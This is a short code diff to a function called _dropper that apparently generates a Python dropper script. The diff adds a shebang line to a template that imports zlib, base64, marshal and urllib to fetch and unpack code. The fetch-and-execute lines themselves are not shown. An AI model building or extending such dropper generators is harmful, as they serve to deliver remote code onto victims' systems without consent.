@@ -448,7 +448,8 @@ def _dropper(options, **kwargs):
 
     name = os.path.join(output_dir, name)
 
-    dropper = """import sys,zlib,base64,marshal,json,urllib
+    dropper = """#!/usr/bin/env python3
+import sys,zlib,base64,marshal,json,urllib
 if sys.version_info[0] > 2:
     from urllib import request
 urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
